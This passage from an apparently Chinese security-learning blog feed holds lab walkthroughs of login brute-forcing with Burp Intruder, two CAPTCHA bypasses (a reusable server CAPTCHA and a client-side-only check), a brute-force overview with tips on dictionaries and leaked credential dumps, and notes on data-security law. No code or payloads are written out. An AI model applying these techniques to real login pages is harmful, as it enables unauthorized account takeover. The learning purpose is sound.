src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.jpg"></p><h4 id="4-尝试操作包中的验证码内容"><a href="#4-尝试操作包中的验证码内容" class="headerlink" title="4.尝试操作包中的验证码内容"></a>4.尝试操作包中的验证码内容</h4><p>&emsp;&emsp;删除验证码：</p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.jpg"></p><p>&emsp;&emsp;删除后发现反馈和不填验证码的效果是一样的。这说明后台对验证码进行了验证。</p><h4 id="5-使用Repeater模块"><a href="#5-使用Repeater模块" class="headerlink" title="5.使用Repeater模块"></a>5.使用Repeater模块</h4><p>&emsp;&emsp;尝试保证当前界面的验证码不变的情况下进行不同账户密码的登录情况</p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.jpg"></p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.jpg"></p><p>&emsp;&emsp;我们可以看见，在使用liaoyue和yue作为登录的账号密码时，验证码不改变，依旧反馈的是用户和密码错误。说明验证码并不是一码一用，只要不点击刷新这个验证码，就能一直用，生存期非常长。所以我们只需要固定验证码这个字符串，替换账号和密码就可以进行暴力破解。话不多说，开干！</p><h4 id="6-开始爆破"><a href="#6-开始爆破" class="headerlink" title="6.开始爆破"></a>6.开始爆破</h4><p>&emsp;&emsp;（具体过程不作更多阐述，可参考上上篇的基于表单的暴力破解，形式基本一样。）</p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20server%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.jpg"></p><p>&emsp;&emsp;可以看见显示爆破成功。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于验证码绕过（on client）的暴力破解</title>
    <link href="/2022/07/30/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/07/30/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="基于验证码绕过（on-client）的暴力破解"><a href="#基于验证码绕过（on-client）的暴力破解" class="headerlink" title="基于验证码绕过（on client）的暴力破解"></a>基于验证码绕过（on client）的暴力破解</h1><h4 id="1-打开登录界面"><a href="#1-打开登录界面" class="headerlink" title="1.打开登录界面"></a>1.打开登录界面</h4><p>&emsp;&emsp;可以看见存在验证码识别:</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.jpg" style="zoom: 67%;" /></center><h4 id="2-输入账号密码查看反馈情况"><a href="#2-输入账号密码查看反馈情况" class="headerlink" title="2.输入账号密码查看反馈情况"></a>2.输入账号密码查看反馈情况</h4><p>&emsp;&emsp;用户密码输入错误情况:</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.jpg" style="zoom:67%;" /></center>&emsp;&emsp;验证码错误的情况：<center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.jpg" style="zoom: 67%;" /></center><p>&emsp;&emsp;验证码为空的情况：</p><center><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.jpg" style="zoom: 67%;" /></center><h4 id="3-使用burp进行抓包"><a href="#3-使用burp进行抓包" class="headerlink" title="3.使用burp进行抓包"></a>3.使用burp进行抓包</h4><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.jpg" alt="image-20220801115855834"></p><h4 id="4-尝试操作包中的验证码内容"><a href="#4-尝试操作包中的验证码内容" class="headerlink" title="4.尝试操作包中的验证码内容"></a>4.尝试操作包中的验证码内容</h4><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.jpg"></p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.jpg"></p><p>&emsp;&emsp;删除后发现反馈和验证码输入正确的效果是一样的。这说明前台对验证码进行了验证。</p><h4 id="5-网页代码查看"><a href="#5-网页代码查看" class="headerlink" title="5.网页代码查看"></a>5.网页代码查看</h4><p>&emsp;&emsp;这里还提供一个思路就是使用开发者插件查看网页代码</p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.jpg"></p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.jpg"></p><p>&emsp;&emsp;这里发现一段用js写的函数，实现了验证码的产生和判断。那么可以猜测后端那边根本就没有验证验证码，所有关于验证码的东西全在前端上。</p><p>&emsp;&emsp;（首先使用开发者工具查看代码是最正确的办法，我这里直接删是为了偷懒！，结果想了想还是算了，不偷懒了）</p><h4 id="6-开始爆破"><a href="#6-开始爆破" class="headerlink" title="6.开始爆破"></a>6.开始爆破</h4><p>&emsp;&emsp;（具体过程不作更多阐述，可参考上一篇的基于表单的暴力破解，形式基本一样。）</p><p><img src="/img/%E5%9F%BA%E4%BA%8E%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88no%20client%EF%BC%89%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.jpg"></p><p>&emsp;&emsp;可以看见显示爆破成功</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>实习相关内容梳理（一）</title>
    <link href="/2022/07/29/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%B8%89/"/>
    <url>/2022/07/29/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1 id="实习相关内容梳理（一）"><a href="#实习相关内容梳理（一）" class="headerlink" title="实习相关内容梳理（一）"></a>实习相关内容梳理（一）</h1><p>&emsp;&emsp;签了保密协议的啦。这是保密内容，不能看哦，看看其他的把！接下来这几天实习的活都是这个了，干就完了！</p><p>&emsp;&emsp;保密协议，是指协议当事人之间就一方告知另一方的书面或口头信息，约定不得向任何第三方披露该等信息的协议。负有保密义务的当事人违反协议约定，将保密信息披露给第三方，将要承担民事责任甚至刑事责任。保密协议一般包括保密内容、责任主体、保密期限、保密义务及违约责任等条款。保密协议可以分为单方保密协议和双方保密协议。单方保密协议是指一方对另一方单方面负有保密义务的协议。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%B8%89/1.png" style="zoom:100%;" /></center>]]></content>
    
    
    <categories>
      
      <category>实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于表单的暴力破解</title>
    <link href="/2022/07/29/%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2022/07/29/%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h1><h4 id="1-表单登录界面"><a href="#1-表单登录界面" class="headerlink" title="1.  表单登录界面"></a>1.  表单登录界面</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.png"></p><p>&emsp;&emsp;通过登录界面可以看到没有验证码要求，可以直接使用暴力破解</p><h4 id="2-随意输入账号密码查看反馈情况"><a href="#2-随意输入账号密码查看反馈情况" class="headerlink" title="2. 随意输入账号密码查看反馈情况"></a>2. 随意输入账号密码查看反馈情况</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.png"></p><p>&emsp;&emsp;发现会提示显示账号密码并不存在</p><h4 id="3-使用burp进行抓包查看"><a href="#3-使用burp进行抓包查看" class="headerlink" title="3.使用burp进行抓包查看"></a>3.使用burp进行抓包查看</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.png"></p><h4 id="4-发送给intruder板块进行暴力破解操作"><a href="#4-发送给intruder板块进行暴力破解操作" class="headerlink" title="4.发送给intruder板块进行暴力破解操作"></a>4.发送给intruder板块进行暴力破解操作</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4-16590182420151.png"></p><p>&emsp;&emsp;注意使用类别，根据情况点击并使用add$设置变量</p><h4 id="5-buro选择字典形式"><a href="#5-buro选择字典形式" class="headerlink" title="5.buro选择字典形式"></a>5.buro选择字典形式</h4><p>&emsp;&emsp;可以使用Simple list手动在下面添加，也可以使用Runtime file添加字典，这里使用Runtime file。</p><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.png"></p><h4 id="6-构建用户名和密码字典"><a href="#6-构建用户名和密码字典" class="headerlink" title="6.构建用户名和密码字典"></a>6.构建用户名和密码字典</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.png"></p><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.png" alt="6"></p><h4 id="7-开始字典攻击"><a href="#7-开始字典攻击" class="headerlink" title="7.开始字典攻击"></a>7.开始字典攻击</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.png"></p><p>&emsp;&emsp;然后单击length可以看到一个长度比较小的，因为密码错误（username or password is not exists）和密码正确（login success）所弹出的字符串长度不一样，所以可以根据返回页面的长度来判断是否成功。</p><h4 id="8-查看对应response里的内容"><a href="#8-查看对应response里的内容" class="headerlink" title="8.查看对应response里的内容"></a>8.查看对应response里的内容</h4><p><img src="/img/%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.png"></p><p>&emsp;&emsp;可以看见显示爆破成功。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全白皮书笔记</title>
    <link href="/2022/07/28/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%BA%8C/"/>
    <url>/2022/07/28/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="数据安全白皮书笔记"><a href="#数据安全白皮书笔记" class="headerlink" title="数据安全白皮书笔记"></a>数据安全白皮书笔记</h1><h3 id="第一章-数据安全形式"><a href="#第一章-数据安全形式" class="headerlink" title="第一章   数据安全形式"></a>第一章   数据安全形式</h3><h4 id="1-1-数据价值"><a href="#1-1-数据价值" class="headerlink" title="1.1  数据价值"></a>1.1  数据价值</h4><p>&emsp;&emsp;数据的重要性：</p><ul><li>数据是数字经济时代的核心生产要素。</li><li>通过法律法规限定达到数据安全合规要求</li></ul><p>&emsp;&emsp;数据利用与数据安全的平衡兼顾存在问题</p><ul><li>对数据资产识别不完整</li><li>数据流动路径无法溯源</li><li>安全与业务难以兼顾</li><li>等</li></ul><h5 id="1-1-1-我国数据发展战略"><a href="#1-1-1-我国数据发展战略" class="headerlink" title="1.1.1 我国数据发展战略"></a>1.1.1 我国数据发展战略</h5><ul><li>2015年8月《促进大数据发展行动纲要》：数据为国家基础性战略资源。</li><li>2016年11月《网络安全法》：鼓励开发网络数据安全保护和利用技术。</li><li>2016年12月《国家网络空间安全战略》：实施国家大数据战略，建立大数据安全管理制度、支持大数据信息技术创新和应用要求。</li><li>2020年4月《关于构建更加完善的要素市场化配制体制机制的意见》：数据与土地、劳动力、资本、技术并称为五种要素。</li><li>2020年5月《关于新时代加快完善社会主义市场经济体制的意见》：加快培育发展数据要素市场。</li><li>2020年10月《中共中央关于制定国民经济和社会发展第十四个五年规划和二O三五年远景目标的建议》</li><li>2021年10月《关于加快推进中央企业两化融合和数字化转型战略合作协议》：推动中央企业加快信息化工业化融合和数字化转型，促进数字技术与实体经济深度融合。</li><li>2021年11月《“十四五”大数据创业发展规划》：加快培育数据要素市场、发挥大数据特性优势、筑牢数据安全保证防线。</li><li>2021年12月《“十四五”国家信息规划》：数据要素是社会生产经营活动，带来经济效益，一电子方式记录的数据资源，是国家发展的战略性基础性资源，是驱动数字经济发展的强大动力。</li><li>2022年1月《“十四五”数字经济发展规划》：充分发挥数据要素作用，必须清华高质量数据要素供给、加快数据要素市场流通、创新数据要素开发利用机制。</li><li>2022年3月《国务院总理李克强政府工作报告》：强化网络安全、数据安全和个人信息保护。</li></ul><h5 id="1-1-2-国外数据发展战略"><a href="#1-1-2-国外数据发展战略" class="headerlink" title="1.1.2 国外数据发展战略"></a>1.1.2 国外数据发展战略</h5><ul><li>美国：率先启动，将大数据上升为国家战略</li><li>欧盟：战略目标是确保成为数据世界的榜样和领导者，建立了完善的法律框架</li></ul><h4 id="1-2-数据安全风险形式"><a href="#1-2-数据安全风险形式" class="headerlink" title="1.2 数据安全风险形式"></a>1.2 数据安全风险形式</h4><h5 id="1-2-1-外部数据安全威胁"><a href="#1-2-1-外部数据安全威胁" class="headerlink" title="1.2.1  外部数据安全威胁"></a>1.2.1  外部数据安全威胁</h5><p>1）数据窃取：</p><ul><li>通过向软件中植入木马窃取数据</li><li>盗用特权账户导致数据泄露</li><li>数据委托处理时被合作方盗用数据</li><li>关联利用已泄露数据发动撞库攻击</li><li>APT高级可持续威胁攻击窃取组织核心机密</li></ul><p>2）数据篡改</p><ul><li>用勒索病毒加密数据敲诈赎金</li><li>利用区块链漏洞攻击智能合约</li></ul><p>3）数据非法使用</p><ul><li>利用网络爬虫抓取和分析隐私数据</li></ul><h5 id="1-2-2-内部数据的安全风险"><a href="#1-2-2-内部数据的安全风险" class="headerlink" title="1.2.2 内部数据的安全风险"></a>1.2.2 内部数据的安全风险</h5><p>1）内部人员有意或无意行为引发的数据安全风险</p><ul><li>数据泄露：<ol><li>越权访问攻击</li><li>数据跨境自由流动</li></ol></li><li>数据窃取<ol><li>内部人员窃取</li><li>员工亲友冒用身份</li><li>研发人员放置后门</li></ol></li><li>数据篡改<ol><li>业务人员违规篡改</li><li>研究人员放置后门</li><li>运维人员为泄愤恶意破坏</li><li>数据意外丢失</li></ol></li></ul><p>2）敏感个人信息非法利用严重侵害个人权益</p><ul><li>敏感个人信息过度手机对个人权益照成巨大损害</li><li>大数据杀熟严重侵害消费者权益</li><li>业务频繁变化引用的数据误用和滥用</li></ul><h5 id="1-2-3-数据安全事件危害性"><a href="#1-2-3-数据安全事件危害性" class="headerlink" title="1.2.3 数据安全事件危害性"></a>1.2.3 数据安全事件危害性</h5><p>1）危害长度日益加剧</p><p>2）影响范围不断扩大</p><h4 id="1-3-监管新措施"><a href="#1-3-监管新措施" class="headerlink" title="1.3 监管新措施"></a>1.3 监管新措施</h4><p>1）国家层面：</p><ul><li>2021年6月  《数据安全法》</li><li>2021年8月  《个人信息保护法》</li><li>2021年11月  《网络数据安全管理条例》</li></ul><p>2）行业层面：</p><ul><li>2020年5月  《银行业金融机构数据治理指引》</li><li>2021年1月  《中国银保监会管数据安全管理办法》</li><li>2021年9月  《工业和信息化领域数据阿全管理办法》</li><li>2022年1月  《金融科技发展规划》</li></ul><p>3）地方层面：</p><ul><li>2018年6月    《贵阳市大数据安全管理条例》</li><li>2018年12月  《天津市促进大数据发展应用条例》</li><li>2021年7月     《深圳经济特区数据条例》</li><li>2021年11月    《上海市数据条例》</li><li>2021年12月    《江苏省公共数据管理办法》</li><li>2022年1月       《浙江省公共数据条例》</li><li>2022年1月       《山东省公共数据开放办法》</li></ul><h3 id="第二章：管理层面"><a href="#第二章：管理层面" class="headerlink" title="第二章：管理层面"></a>第二章：管理层面</h3><h4 id="2-1-管理层面"><a href="#2-1-管理层面" class="headerlink" title="2.1 管理层面"></a>2.1 管理层面</h4><h5 id="2-1-1-多法并轨、多标准并行下缺乏一致性的合规治理手段"><a href="#2-1-1-多法并轨、多标准并行下缺乏一致性的合规治理手段" class="headerlink" title="2.1.1 多法并轨、多标准并行下缺乏一致性的合规治理手段"></a>2.1.1 多法并轨、多标准并行下缺乏一致性的合规治理手段</h5><ul><li>痛点：“三法三条例”</li><li>需求</li></ul><h3 id="第四章-法律法规标准解读"><a href="#第四章-法律法规标准解读" class="headerlink" title="第四章   法律法规标准解读"></a>第四章   法律法规标准解读</h3><h4 id="4-1-国内法律法规与行业标准解读"><a href="#4-1-国内法律法规与行业标准解读" class="headerlink" title="4.1 国内法律法规与行业标准解读"></a>4.1 国内法律法规与行业标准解读</h4><h5 id="4-1-1-法律"><a href="#4-1-1-法律" class="headerlink" title="4.1.1 法律"></a>4.1.1 法律</h5><p>&emsp;1）《网络安全法》保障网络与信息安全</p><p>&emsp;&emsp;全面地规定网络与信息安全治理的基本规则，以网络运营者及关键信息基础设施运营者为主要规制对象，明确网络运行安全，网络信息安全、监测预警与应急处置等方面的义务。</p><ul><li>保证网络运行安全</li><li>保障网络用户信息安全</li><li>保障网络数据安全</li></ul><p>&emsp;2）《数据安全法》构建数据安全治理框架</p><ul><li>数据开放利用与数据安全并重</li><li>构建数据安全制度体系</li><li>实施全生命周期的数据安全保护</li><li>推进政务数据的安全与开放</li></ul><p>&emsp;3）《个人信息保护法》保证个人信息全生命周期处理的安全</p><ul><li>个人信息全生命周期处理的防护</li><li>明确个人信息处理者所应采取的组织措施及技术措施</li><li>赋予个人充分的个人信息权益</li></ul><h5 id="4-1-2-行政法规"><a href="#4-1-2-行政法规" class="headerlink" title="4.1.2 行政法规"></a>4.1.2 行政法规</h5><p>&emsp;1）《关键信息基础设施安全保护条例》实施关键信息基础设施重点保护</p><ul><li>重点防范关键信息基础设施风险</li><li>重点强调对数据安全的保护</li></ul><p>&emsp;2）《网络数据安全管理条例》细化数据安全治理规则</p><h5 id="4-1-3-部门规章及规范性文件"><a href="#4-1-3-部门规章及规范性文件" class="headerlink" title="4.1.3 部门规章及规范性文件"></a>4.1.3 部门规章及规范性文件</h5><p>&emsp;1）各行业各部门数据安全的协同治理</p><p>&emsp;2）数据安全治理领域的重要规范</p><ul><li>整体要求</li><li>金融领域</li><li>工业和互联网</li></ul><h5 id="4-1-4-地方性法规"><a href="#4-1-4-地方性法规" class="headerlink" title="4.1.4 地方性法规"></a>4.1.4 地方性法规</h5><p>&emsp;1）创新数据安全治理新模式</p><p>&emsp;2）提供公共数据治理的模式借鉴</p><h5 id="4-1-5-国家标准、行业标准及相关指南"><a href="#4-1-5-国家标准、行业标准及相关指南" class="headerlink" title="4.1.5 国家标准、行业标准及相关指南"></a>4.1.5 国家标准、行业标准及相关指南</h5><h4 id="4-2-国际数据拿权政策与法规概述"><a href="#4-2-国际数据拿权政策与法规概述" class="headerlink" title="4.2 国际数据拿权政策与法规概述"></a>4.2 国际数据拿权政策与法规概述</h4><h5 id="4-2-1-欧洲的政策和法律"><a href="#4-2-1-欧洲的政策和法律" class="headerlink" title="4.2.1 欧洲的政策和法律"></a>4.2.1 欧洲的政策和法律</h5><p>&emsp;1）欧盟</p><ul><li>《通用数据保护条例》</li><li>《网络信息系统安全指令》</li></ul><p>&emsp;2）法国</p><ul><li>《第78-17号法案》</li></ul><p>&emsp;3）德国</p><ul><li>《联邦数据安全法》</li></ul><p>&emsp;4）英国</p><ul><li>《英国GDPR》</li></ul><p>&emsp;5）俄罗斯</p><ul><li>《242-FZ（12.31.2014）》</li></ul><h5 id="4-2-2-美国的政策和法律"><a href="#4-2-2-美国的政策和法律" class="headerlink" title="4.2.2 美国的政策和法律"></a>4.2.2 美国的政策和法律</h5><p>&emsp;1）联邦</p><p>&emsp;2）州</p><h5 id="4-2-3-其他国家的政策和法律"><a href="#4-2-3-其他国家的政策和法律" class="headerlink" title="4.2.3 其他国家的政策和法律"></a>4.2.3 其他国家的政策和法律</h5><p>&emsp;1）澳大利亚</p><ul><li>信息安全注册评估</li></ul><p>&emsp;2）日本</p><ul><li>《个人信息保护法》</li></ul><p>&emsp;3）阿根廷</p><ul><li>《个人数据保护法》</li></ul>]]></content>
    
    
    <categories>
      
      <category>实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暴力破解概述</title>
    <link href="/2022/07/28/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%A6%82%E8%BF%B0/"/>
    <url>/2022/07/28/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="暴力破解概述"><a href="#暴力破解概述" class="headerlink" title="暴力破解概述"></a>暴力破解概述</h1><h4 id="1-概述："><a href="#1-概述：" class="headerlink" title="1.概述："></a>1.概述：</h4><p>&emsp;&emsp;“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间。</p><h4 id="2-对象："><a href="#2-对象：" class="headerlink" title="2.对象："></a>2.对象：</h4><p>&emsp;&emsp;需要账号密码登录的端口</p><h4 id="3-组成："><a href="#3-组成：" class="headerlink" title="3.组成："></a>3.组成：</h4><p>&emsp;&emsp;连续性尝试+字典+自动化</p><h4 id="4-字典来源："><a href="#4-字典来源：" class="headerlink" title="4.字典来源："></a>4.字典来源：</h4><ul><li>常用的账号密码（弱口令）</li><li>互联网上被脱库后的账号密码（譬如当初csdn泄露的600w用户信息，也就是所谓的撞库）</li><li>使用特定的字符使用工具按照指定的规则进行排列组合算法生成不同的密码</li></ul><p>&emsp;&emsp;（提示：作为渗透人员，一定要多保留一些字典）</p><p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%A6%82%E8%BF%B0/2.jpg"></p><h4 id="5-暴力破解漏洞："><a href="#5-暴力破解漏洞：" class="headerlink" title="5.暴力破解漏洞："></a>5.暴力破解漏洞：</h4><p>&emsp;&emsp;如果一个网站没有对登录接口实施暴力破解的措施，或者实施了不合理的措施，则称该网站存在暴力破解漏洞。</p><h4 id="6-漏洞判断标准："><a href="#6-漏洞判断标准：" class="headerlink" title="6.漏洞判断标准："></a>6.漏洞判断标准：</h4><ul><li>是否要求用户设置了复杂的密码；</li><li>是否每次认证都使用了安全的验证码；</li><li>是否对尝试登录的行为进行判断和限制；</li><li>是否在必要的情况下采用了双因素认证；</li><li>等等</li></ul><h4 id="7-暴力破解漏洞测试流程："><a href="#7-暴力破解漏洞测试流程：" class="headerlink" title="7.暴力破解漏洞测试流程："></a>7.暴力破解漏洞测试流程：</h4><ol><li><p>确认登录端口的脆弱性</p><p>​        可以通过登录抓包的形式，观察验证元素和response信息等，判断是否存在被暴力破解的可能</p></li><li><p>对字典进行优化</p><p>​        根据实际情况选择不同的字典并对字典进行优化，提高爆破过程的效率。优化技巧：</p><ul><li>技巧一：根据注册提示信息进行优化，对目标站点进行注册，了解账号密码的限制条件，通过限制条件对字典进行相关优化</li><li>技巧二：如果爆破的是管理后台，往往这类系统的管理员是admin/administrator/root的可能性较高。，可以使用这三个账号+随机的密码进行登录尝试，并且根据反馈的结果确定用户名。譬如当返回“用户名或密码错误”时，则需要修改用户名和密码，若仅返回“密码错误”则基本可以确定用户名的准确性</li></ul></li><li><p>工具自动化操作</p><p>​        配置自动化工具（通过现成、超时时间、重复次数等），实现自动化爆破操作</p></li></ol><h4 id="8-Burp暴力破解板块（intruder）功能："><a href="#8-Burp暴力破解板块（intruder）功能：" class="headerlink" title="8.Burp暴力破解板块（intruder）功能："></a>8.Burp暴力破解板块（intruder）功能：</h4><ol><li>target：<ul><li>设置攻击目标，可以通过proxy发送</li></ul></li><li>pasition：<ul><li>niper（单字典，单position替换尝试）</li><li>Battering ram（单字典，多个Position同个秘钥尝试）</li><li>Pitchfork（多个字典，同序号进行替换）</li><li>Cluster bomb（多字典，多行对应多行的尝试）</li></ul></li><li>payloads：<ul><li>设置字典，并可以对字典进行统一的策略处理</li></ul></li><li>options：<ul><li>对扫描的线程、失败重试等进行配置</li><li>对结果设置设置匹配的flag：通过一个标识符来区别结果，并在结果栏中flag出来</li></ul></li></ol><p><img src="/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%A6%82%E8%BF%B0/1.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全法律法规梳理</title>
    <link href="/2022/07/27/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%B8%80/"/>
    <url>/2022/07/27/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="数据安全法律法规梳理"><a href="#数据安全法律法规梳理" class="headerlink" title="数据安全法律法规梳理"></a>数据安全法律法规梳理</h1><h4 id="1-国家层面："><a href="#1-国家层面：" class="headerlink" title="1.国家层面："></a>1.国家层面：</h4><ul><li><p><input disabled="" type="checkbox"> </p><h5 id="《网络安全法》"><a href="#《网络安全法》" class="headerlink" title="《网络安全法》"></a>《网络安全法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span 